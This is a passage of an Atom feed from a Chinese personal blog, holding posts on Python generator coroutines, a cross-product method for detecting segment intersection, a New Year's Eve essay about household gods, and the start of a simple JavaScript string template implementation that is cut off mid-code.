<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> co <span class="keyword">import</span> coroutine</span><br><span class="line"><span class="keyword">from</span> sleep <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> runner</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@coroutine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">long_add</span><span class="params">(x, y, duration=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">yield</span> sleep(duration)</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@coroutine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(duration)</span>:</span></span><br><span class="line">    print(<span class="string">'start:'</span>, time())</span><br><span class="line">    print((<span class="keyword">yield</span> long_add(<span class="number">1</span>, <span class="number">2</span>, duration)), time())</span><br><span class="line">    print((<span class="keyword">yield</span> long_add(<span class="number">3</span>, <span class="number">4</span>, duration)), time())</span><br><span class="line"></span><br><span class="line">task(<span class="number">2</span>)</span><br><span class="line">task(<span class="number">1</span>)</span><br><span class="line">runner.run()</span><br></pre></td></tr></table></figure>
<p>由于我们使用了一个糟糕的事件轮询机制，密集的计算会阻塞通往 <code>stdout</code> 的输出，因而看起来所有的结果都是一起打印出来的。为此，我在打印时特地加上了时间戳，以演示协程的效果。输出如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start: <span class="number">1459609512.263156</span></span><br><span class="line">start: <span class="number">1459609512.263212</span></span><br><span class="line"><span class="number">3</span> <span class="number">1459609513.2632613</span></span><br><span class="line"><span class="number">3</span> <span class="number">1459609514.2632234</span></span><br><span class="line"><span class="number">7</span> <span class="number">1459609514.263319</span></span><br><span class="line"><span class="number">7</span> <span class="number">1459609516.2633028</span></span><br></pre></td></tr></table></figure>
<p>这事实上是 <code>tornado.gen.coroutine</code> 的简化版本，为了叙述方便我略去了许多细节，如异常处理以及调度优化，目的是让大家能较清晰地了解 生成器协程 背后的机制。因此，<strong>这段代码并不能用于实际生产中</strong>。</p>
<h2 id="小结">小结</h2><ul>
<li>这，才叫精通生成器。</li>
<li>学习编程，不仅要知其然，亦要知其所以然。</li>
<li>Python 是有魔法的，只有想不到，没有做不到。</li>
</ul>
<h2 id="References">References</h2><ul>
<li><a href="https://github.com/tornadoweb/tornado/blob/master/tornado/gen.py#L245" target="_blank" rel="external">tornado.gen.coroutine</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="写在前面">写在前面</h2><blockquote>
<ul>
<li>本文默认读者对 Python 生成器 有一定的了解，不了解者请移步至<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b3]]>
    </summary>
    
      <category term="coroutine" scheme="http://hsfzxjy.github.io/tags/coroutine/"/>
    
      <category term="generator" scheme="http://hsfzxjy.github.io/tags/generator/"/>
    
      <category term="python" scheme="http://hsfzxjy.github.io/tags/python/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[数学美 之 判断线段相交的最简方法]]></title>
    <link href="http://hsfzxjy.github.io//the-simplest-way-to-find-out-if-two-segments-are-intersected/"/>
    <id>http://hsfzxjy.github.io//the-simplest-way-to-find-out-if-two-segments-are-intersected/</id>
    <published>2016-02-18T16:00:00.000Z</published>
    <updated>2016-02-19T04:24:23.566Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>解析几何的巅峰<br>是 向量<br>那无关过程的狂妄与简洁<br>映射着大自然无与伦比的美</p>
</blockquote>
<h2 id="引子">引子</h2><p>如何判断两条直线是否相交？</p>
<p>这很容易。平面直线，无非就是两种关系：相交 或 平行。因此，只需判断它们是否平行即可。而直线平行，等价于它们的斜率相等，只需分别计算出它们的斜率，即可做出判断。</p>
<p>但倘若我把“直线”换成“线段”呢——如何判断两条线段是否相交？</p>
<p>这就有些难度了。和 直线 不同，线段 是有固定长度的，即使它们所属的两条直线相交，这两条线段也不一定相交。</p>
<p>也许你会说：分情况讨论不就行了嘛：</p>
<ul>
<li>先计算两条线段的斜率，判断是否平行。若平行，则一定不相交。</li>
<li>若不平行，求出两条线段的直线方程，联立之，解出交点坐标。</li>
<li>运用定比分点公式，判断交点是否在两条线段上。</li>
</ul>
<p>的确，从理论上这是一个可行的办法，这也是人们手动计算时普遍采用的方法。</p>
<p>然而，这个方法并不怎么适用于计算机。原因如下：</p>
<ul>
<li>计算中出现了除法（斜率计算、定比分点），因此每次计算前都要判断除数是否为 0（或接近 0）。这很麻烦，严重干扰逻辑的表达。</li>
<li>浮点精度丢失带来的误差。人类计算时可以采用分数，但计算机不行。计算机在储存浮点数时会有精度丢失的现象。一旦算法的计算量大起来，误差会被急剧放大，影响结果准确性。</li>
<li>效率低下。浮点乘除会十分耗时，不适用于对实时性要求较高的生产环境（如 游戏）。</li>
</ul>
<p><img src="http://www.qqday.com/uploads/allimg/120627/09210Bb8-3.png" alt=""></p>
<p>那么，有更好的方法？</p>
<p>当然有。<br><a id="more"></a></p>
<h2 id="类型预定义">类型预定义</h2><p>本文的算法将用 python 描述，主要用到两个数据类型：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 点</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x, self.y = x, y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vector</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, start_point, end_point)</span>:</span></span><br><span class="line">        self.start, self.end = start_point, end_point</span><br><span class="line">        self.x = end_point.x - start_point.x</span><br><span class="line">        self.y = end_point.y - start_point.y</span><br></pre></td></tr></table></figure>
<p>先在此处说明。</p>
<h2 id="问题分析">问题分析</h2><p>对于“判断两条直线是否相交”这个问题，我们之所以能迅速而准确地进行判断，是因为“相交”与“不相交”这两个状态有着明显的不同点，即 <strong>斜率是否相等</strong>。</p>
<p>那么现在，为了判断两条线段是否相交，我们也要找出“相交”与“不相交”这两个状态的不同点。</p>
<p>假设现在有两条线段 AB 和 CD，我们画出它们之间的三种关系：</p>
<ol>
<li><img src="https://segmentfault.com/img/bVsRnf" alt="不相交"></li>
<li><img src="https://segmentfault.com/img/bVsRmQ" alt="交点位于某条线段上"></li>
<li><img src="https://segmentfault.com/img/bVsRnh" alt="相交"></li>
</ol>
<p>其中，情况 1 为不相交，情况 2、3 为相交。</p>
<p>作出向量 AC、AD、BC、BD。</p>
<p>首先介绍一个概念： <strong>向量有序对的旋转方向</strong>。这个概念指：对于共起点有序向量二元组<code>(a, b)</code>，其旋转方向为 <strong>使 a 能够旋转一个小于 180 度的角并与 b 重合的方向</strong>，简记为 <code>direct(a, b)</code>。若 <code>a</code> 和 <code>b</code> 反向共线，则旋转方向取任意值。</p>
<p>举个例子：图一中，<code>direct(AC, AD)</code> 为顺时针方向。</p>
<p>接下来我们要分析四个值：<code>direct(AC, AD)</code>、<code>direct(BC, BD)</code>、<code>direct(CA, CB)</code>、<code>direct(DA, DB)</code>。</p>
<ol>
<li>对于图一，<code>direct(AC, AD)</code> 和 <code>direct(BC, BD)</code> 都为顺时针，<code>direct(CA, CB)</code> 为逆时针，<code>direct(DA, DB)</code> 为顺时针。</li>
<li>对于图二，<code>direct(AC, AD)</code> 为顺时针，<code>direct(BC, BD)</code> 为任意方向，<code>direct(CA, CB)</code> 为逆时针，<code>direct(DA, DB)</code> 为顺时针。</li>
<li>对于图三，<code>direct(AC, AD)</code>、<code>direct(DA, DB)</code> 为顺时针，<code>direct(BC, BD)</code>、<code>direct(CA, CB)</code> 为逆时针。</li>
</ol>
<p>不难发现，两条线段相交的充要条件是：<code>direct(AC, AD) != direct(BC, BD)</code> 且 <code>direct(CA, CB) != direct(DA, DB)</code>。这便是“相交”与“不相交”这两个状态的不同点。</p>
<p>然而你可能会觉得：旋转方向这么一个虚无飘渺的东西，怎么用程序去描述啊？</p>
<p>再来看一幅图：</p>
<p><img src="https://segmentfault.com/img/bVsRna" alt=""></p>
<p>再来定义有向角：</p>
<blockquote>
<p>有向角 <code>&lt;a, b&gt;</code> 为 向量<code>a</code> <strong>逆时针</strong> 旋转到与 向量<code>b</code> 重合所经过的角度。</p>
</blockquote>
<p>不难看出，对于向量<code>a</code>、<code>b</code>：</p>
<ul>
<li>若 <code>direct(a, b)</code> 为逆时针，则 <code>0 &lt;= &lt;a, b&gt; &lt;= 180</code>，从而 <code>sin&lt;a, b&gt; &gt;= 0</code>。</li>
<li>若 <code>direct(a, b)</code> 为顺时针，则 <code>180 &lt;= &lt;a, b&gt; &lt;= 360</code>，从而 <code>sin&lt;a, b&gt; &lt;= 0</code>。</li>
</ul>
<p>这样一来，我们可以将旋转方向的问题转化为 <strong>求有向角正弦值</strong> 的问题。而这个问题，是很容易的。</p>
<p>如上图，记</p>
<p>$$ OA = (x_1, y_1), OB = (x_2, y_2) $$<br>$$ |OA| = r_1, |OB| = r_2 $$</p>
<p>则</p>
<p>$$ sin(\lt OA, OB\gt) $$<br>$$ = sin \theta $$<br>$$ = sin (\beta - \alpha) $$<br>$$ = sin \beta cos \alpha - sin \alpha cos \beta $$<br>$$ = \frac{(sin \beta cos \alpha - sin \alpha cos \beta) * r_1 * r_2}{r_1 * r_2} $$<br>$$ = {(x_1 * y_2 - x_2 * y_1) \over (r_1 * r_2)} $$</p>
<p>而这里，我们要的只是 <code>sin(&lt;OA, OB&gt;)</code> 的符号，而 <code>r1</code> 和 <code>r2</code> 又都是恒正的，因此只需判断 <code>x1 * y2 - x2 * y1</code> 的符号即可。</p>
<p>这个方法的数学背景是 <strong>叉乘</strong>，可以前往 <a href="https://zh.wikipedia.org/wiki/%E5%90%91%E9%87%8F%E7%A7%AF" target="_blank" rel="external">Wikipedia</a> 了解更多。</p>
<h2 id="思路小结">思路小结</h2><ul>
<li>由点 A，B，C，D 计算出向量 AC，AD，BC，BD</li>
<li>计算 <code>sin(&lt;AC, AD&gt;) * sin(&lt;BC, BD&gt;)</code> 和 <code>sin(&lt;CA, CB&gt;) * sin(&lt;DA, DB&gt;)</code>，若皆为非正数，则相交；否则，不相交。</li>
</ul>
<h2 id="实现">实现</h2><p>终于到代码部分了，想必大家都已不耐烦了吧。</p>
<p>在向量的辅助下，代码显得异常简单。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ZERO = <span class="number">1e-9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">negative</span><span class="params">(vector)</span>:</span></span><br><span class="line">    <span class="string">"""取反"""</span></span><br><span class="line">    <span class="keyword">return</span> Vector(vector.end_point, vector.start_point)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vector_product</span><span class="params">(vectorA, vectorB)</span>:</span></span><br><span class="line">    <span class="string">'''计算 x_1 * y_2 - x_2 * y_1'''</span></span><br><span class="line">    <span class="keyword">return</span> vectorA.x * vectorB.y - vectorB.x * vectorA.y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_intersected</span><span class="params">(A, B, C, D)</span>:</span></span><br><span class="line">    <span class="string">'''A, B, C, D 为 Point 类型'''</span></span><br><span class="line">    AC = Vector(A, C)</span><br><span class="line">    AD = Vector(A, D)</span><br><span class="line">    BC = Vector(B, C)</span><br><span class="line">    BD = Vector(B, D)</span><br><span class="line">    CA = negative(AC)</span><br><span class="line">    CB = negative(BC)</span><br><span class="line">    DA = negative(AD)</span><br><span class="line">    DB = negative(BD)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (vector_product(AC, AD) * vector_product(BC, BD) &lt;= ZERO) \</span><br><span class="line">        <span class="keyword">and</span> (vector_product(CA, CB) * vector_product(DA, DB) &lt;= ZERO)</span><br></pre></td></tr></table></figure>
<p>一气呵成，没有恼人的除法，没有情况讨论，只是纯粹的简单运算。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>解析几何的巅峰<br>是 向量<br>那无关过程的狂妄与简洁<br>映射着大自然无与伦比的美</p>
</blockquote>
<h2 id="引子">引子</h2><p>如何判断两条直线是否相交？</p>
<p>这很容易。平面直线，无非就是两种关系：相交 或 平行。因此，只需判断它们是否平行即可。而直线平行，等价于它们的斜率相等，只需分别计算出它们的斜率，即可做出判断。</p>
<p>但倘若我把“直线”换成“线段”呢——如何判断两条线段是否相交？</p>
<p>这就有些难度了。和 直线 不同，线段 是有固定长度的，即使它们所属的两条直线相交，这两条线段也不一定相交。</p>
<p>也许你会说：分情况讨论不就行了嘛：</p>
<ul>
<li>先计算两条线段的斜率，判断是否平行。若平行，则一定不相交。</li>
<li>若不平行，求出两条线段的直线方程，联立之，解出交点坐标。</li>
<li>运用定比分点公式，判断交点是否在两条线段上。</li>
</ul>
<p>的确，从理论上这是一个可行的办法，这也是人们手动计算时普遍采用的方法。</p>
<p>然而，这个方法并不怎么适用于计算机。原因如下：</p>
<ul>
<li>计算中出现了除法（斜率计算、定比分点），因此每次计算前都要判断除数是否为 0（或接近 0）。这很麻烦，严重干扰逻辑的表达。</li>
<li>浮点精度丢失带来的误差。人类计算时可以采用分数，但计算机不行。计算机在储存浮点数时会有精度丢失的现象。一旦算法的计算量大起来，误差会被急剧放大，影响结果准确性。</li>
<li>效率低下。浮点乘除会十分耗时，不适用于对实时性要求较高的生产环境（如 游戏）。</li>
</ul>
<p><img src="http://www.qqday.com/uploads/allimg/120627/09210Bb8-3.png" alt=""></p>
<p>那么，有更好的方法？</p>
<p>当然有。<br>]]>
    
    </summary>
    
      <category term="向量" scheme="http://hsfzxjy.github.io/tags/%E5%90%91%E9%87%8F/"/>
    
      <category term="数学" scheme="http://hsfzxjy.github.io/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="计算几何" scheme="http://hsfzxjy.github.io/tags/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[除夕杂感]]></title>
    <link href="http://hsfzxjy.github.io//thinking-in-the-day-before-lunar-new-year-of-2016/"/>
    <id>http://hsfzxjy.github.io//thinking-in-the-day-before-lunar-new-year-of-2016/</id>
    <published>2016-02-12T16:00:00.000Z</published>
    <updated>2016-02-13T13:46:13.194Z</updated>
    <content type="html"><![CDATA[<!--## 一-->
<p>直到下午四点，供桌才摆上。</p>
<p>冒着热气的鸡，整只；两尾鱼，张着嘴卧在盘中；一摞柑，愣是叠成了宝塔的形状；此外，还有一包包花花绿绿的零食。一米见方的桌子被塞得满满的，全是贡品。</p>
<p>母亲忙得团团转。本来是不想拜天公的，但转念一想，不是太好，便摆上了。阳光下，热气一直往上冒，往上冒，直到看不见的地方——那里，想必就住着那位神。</p>
<p>看来，这位神一定是个重要人物了——不然，母亲怎会遗忘了其他的几位，而只供奉他一个？</p>
<p>搬家之前，家里可还是住着许多神的：门口有一个，阳台上有一个，厨房有一个，抽屉下有一个，就连洗衣机上也有一个。听母亲说：每一家都有，每一位神，都在守卫着这个家。</p>
<p>神们也不是白干活，也是要吃饭的。不只是过年，每个月中总有那么几天，神们会一起来要吃的。每到这时，母亲便会忙活起来，为他们张罗吃的。好在他们并不挑剔——生的，熟的，速食的，神们都默默地收下了。当然，贡品在屋子里转了一圈，自然又都进到了我们的肚子里。</p>
<p>每换一个地方，母亲便上一炷香，虔诚地跪下来，轻轻地拜两拜，口中念念有词。</p>
<p>接着，她又拉我一起来。</p>
<p>我不懂，她便教我——想着自己想要的事就好了。</p>
<p>我学着样子跪下来，胡乱说了几句，装模作样地拜了两拜，余光却仍盯着那食物。</p>
<p>听母亲说，这是老家带来的习俗。对神的敬畏，在那个古老的地方，说着那古老语言的人们，已经沿袭了很久很久了。</p>
<p>人终是怕神的——以前是，现在也是；中国是，外国也是。神像一群喜欢偷窥的人，在这里，也在那里，在每个角落偷窥着你。你受欺负时，神会给你庇护；你做坏事时，神会予你惩罚。因此，怕神的人，多是善良的。</p>
<p>说是怕神，倒不如说是怕天，敬畏变幻莫测的未知。活物总是怀着对死亡的恐惧，人类也不例外。未知中蕴藏着杀机，使愚昧的人类感到不安，转而求助于那假象中的造物主，那超能力者，那个开着全局视角看戏的“人”，这便成了“神”。神为人类抵挡着未知，人类也因此安分守己，深怕触犯了神，再次被暴露于未知的荒野中。</p>
<p>然而，神正在离去，因为未知正在散去。</p>
<p>但藏在那未知背后的是什么，谁又知道呢？未知的背后仍是未知，现实可以是虚幻，真理也可以是谬误，时间洪流夹带着未知，使任何人都只能屏息，任何人，都不可以妄自尊大。</p>
<p>好在，还有神——尽管神正在离去。</p>
<p>但终究，怕神的人是善良的。</p>
<!--## 二

母亲跪在供桌前，红着眼圈，抽泣着。

供桌背后，是明净的落地窗——厚重的窗帘已被拆下，在洗衣机里轰鸣着。透过窗子，可以看见这个城市，在阳光下闪着金光。

与其说是在拜天公，倒不如说是在祭拜整个世界。

物欲横流的世界。人们渐行渐远的世界。

门外，父亲许久没有发声。

母亲和父亲刚吵了一架。父亲又出去打麻将了，在除夕，家里只有母亲一个人在忙活。

母亲措辞犀利，出言不逊，像是有憋了一整年的怨气。叫罢，便像孩子一样失声哭了起来。

父亲自知理亏，一直没有发声。

其实，父亲只是想娱乐一下而已。纷纷扰扰的世事，压迫着每一个人，谁都有烦恼的时候。

或许，父亲只是把春节当成是一个稍长的假期罢了，但母亲不这么想。观念的分歧，引起了这场纠纷。
-->
]]></content>
    <summary type="html">
    <![CDATA[<!--## 一-->
<p>直到下午四点，供桌才摆上。</p>
<p>冒着热气的鸡，整只；两尾鱼，张着嘴卧在盘中；一摞柑，愣是叠成了宝塔的形状；此外，还有一包包花花绿绿的零食。一米见方的桌子被塞得满满的，全是贡品。</p>
<p>母亲忙得团团转。本来是不想拜天公的，但转念一想，]]>
    </summary>
    
      <category term="随想" scheme="http://hsfzxjy.github.io/tags/%E9%9A%8F%E6%83%B3/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[17 行代码实现的简易 Javascript 字符串模板]]></title>
    <link href="http://hsfzxjy.github.io//a-simple-javascript-template-language/"/>
    <id>http://hsfzxjy.github.io//a-simple-javascript-template-language/</id>
    <published>2016-02-11T16:00:00.000Z</published>
    <updated>2016-03-26T11:05:21.678Z</updated>
    <content type="html"><![CDATA[<p>这是源于两年前，当我在做人生中第一个真正意义上的网站时遇到的一个问题</p>
<p>该网站采用前后端分离的方式，由后端的 REST 接口返回 JSON 数据，再由前端渲染到页面上。</p>
<p>同许多初学 Javascript 的菜鸟一样，起初，我也是采用拼接字符串的形式，将 JSON 数据嵌入 HTML 中。开始时代码量较少，暂时还可以接受。但当页面结构复杂起来后，其弱点开始变得无法忍受起来：</p>
<ul>
<li><strong>书写不连贯</strong>。每写一个变量就要断一下，插入一个 <code>+</code> 和 <code>&quot;</code>。十分容易出错。</li>
<li><strong>无法重用</strong>。HTML 片段都是离散化的数据，难以对其中重复的部分进行提取。</li>
<li><strong>无法很好地利用 <code>&lt;template&gt;</code> 标签</strong>。这是 HTML5 中新增的一个标签，标准极力推荐将 HTML 模板放入 <code>&lt;template&gt;</code> 标签中，使代码更简洁。</li>
</ul>
<p>当时我的心情就是这样的：</p>
<p><img src="http://i6.hexunimg.cn/2012-05-09/141219425.jpg" alt=""></p>
<p>为了解决这个问题，我暂时放下了手上的项目，花了半个小时实现一个极简易的字符串模板。</p>
<a id="more"></a>
<h2 id="需求描述">需求描述</h2><p>实现一个 <code>render(template, context)</code> 方法，将 <code>template</code> 中的占位符用 <code>context</code> 填充。要求：</p>
<ol>
<li>不需要有控制流成分（如 循环、条件 等等），只要有变量替换功能即可</li>
<li>级联的变量也可以展开</li>
<li>被转义的的分隔符 <code>{</code> 和 <code>}</code> 不应该被渲染，分隔符与变量之间允许有空白字符</li>
</ol>
<p>例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">render(<span class="string">'My name is &#123;name&#125;'</span>， &#123;</span><br><span class="line">    name: <span class="string">'hsfzxjy'</span></span><br><span class="line">&#125;);  <span class="comment">// My name is hsfzxjy</span></span><br><span class="line"></span><br><span class="line">render(<span class="string">'I am in &#123;profile.location&#125;'</span>, &#123;</span><br><span class="line">    name: <span class="string">'hsfzxjy'</span>,</span><br><span class="line">    profile: &#123;</span><br><span class="line">        location: <span class="string">'Guangzhou'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;); <span class="comment">// I am in Guangzhou</span></span><br><span class="line"></span><br><span class="line">render(<span class="string">'&#123; greeting &#125;. \\&#123; This block will not be rendered &#125;'</span>, &#123;</span><br><span class="line">    greeting: <span class="string">'Hi'</span></span><br><span class="line">&#125;); <span class="comment">// Hi. &#123; This block will not be rendered &#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="实现">实现</h2><p>先写下函数的框架：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">template, context</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显然，要做的第一件事便是 <strong>匹配模板中的占位符</strong>。</p>
<h3 id="匹配占位符">匹配占位符</h3><p>匹配的事，肯定是交给正则表达式来完成。那么，这个正则表达式应该长什么样呢？</p>
<p>根据 需求 1、2 的描述，我们可以写出：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/\&#123;([^\&#123;\&#125;]+)\&#125;/g</span>;</span><br></pre></td></tr></table></figure>
<p>至于需求 3，我第一个想到的概念是 <strong>前向匹配</strong>，可惜 Javascript 并不支持，只好用一个折衷的办法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/(\\)?\&#123;([^\&#123;\&#125;\\]+)(\\)?\&#125;/g</span>;</span><br><span class="line"><span class="comment">// 若是第一个或第三个分组值不为空，则不渲染</span></span><br></pre></td></tr></table></figure>
<p>现在，代码应该是这样：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">template, context</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tokenReg = <span class="regexp">/(\\)?\&#123;([^\&#123;\&#125;\\]+)(\\)?\&#125;/g</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> template.replace(tokenReg, <span class="function"><span class="keyword">function</span> (<span class="params">word, slash1, token, slash2</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (slash1 || slash2) &#123;  <span class="comment">// 匹配到转义字符</span></span><br><span class="line">            <span class="keyword">return</span> word.replace(<span class="string">'\\'</span>, <span class="string">''</span>); <span class="comment">// 如果 分隔符被转义，则不渲染</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="占位符替换">占位符替换</h3><p>嗯，正则表达式确定了，接下来要做的便是替换工作。</p>
<p>根据 需求2，模板引擎不仅要能渲染一级变量，更要渲染多级变量。这该怎么做呢？</p>
<p>其实很简单：将 <code>token</code> 按 <code>.</code> 分隔开，逐级查找即可：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> variables = token.replace(<span class="regexp">/\s/g</span>, <span class="string">''</span>).split(<span class="string">'.'</span>); <span class="comment">// 切割 token</span></span><br><span class="line"><span class="keyword">var</span> currentObject = context;</span><br><span class="line"><span class="keyword">var</span> i, length, variable;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逐级查找 context</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, length = variables.length; i &lt; length; ++i) &#123;</span><br><span class="line">    variable = variables[i];</span><br><span class="line">    currentObject = currentObject[variable];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> currentObject;</span><br></pre></td></tr></table></figure>
<p>不过，有可能 <code>token</code> 指定的变量并不存在，这时上面的代码便会报错。为了更好的体验，代码最好有一定的容错能力：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> variables = token.replace(<span class="regexp">/\s/g</span>, <span class="string">''</span>).split(<span class="string">'.'</span>); <span class="comment">// 切割 token</span></span><br><span class="line"><span class="keyword">var</span> currentObject = context;</span><br><span class="line"><span class="keyword">var</span> i, length, variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, length = variables.length; i &lt; length; ++i) &#123;</span><br><span class="line">    variable = variables[i];</span><br><span class="line">    currentObject = currentObject[variable];</span><br><span class="line">    <span class="keyword">if</span> (currentObject === <span class="literal">undefined</span> || currentObject === <span class="literal">null</span>) <span class="keyword">return</span> <span class="string">''</span>; <span class="comment">// 如果当前索引的对象不存在，则直接返回空字符串。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> currentObject;</span><br></pre></td></tr></table></figure>
<p>把所有的代码组合在一起，便得到了最终的版本：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">template, context</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tokenReg = <span class="regexp">/(\\)?\&#123;([^\&#123;\&#125;\\]+)(\\)?\&#125;/g</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> template.replace(tokenReg, <span class="function"><span class="keyword">function</span> (<span 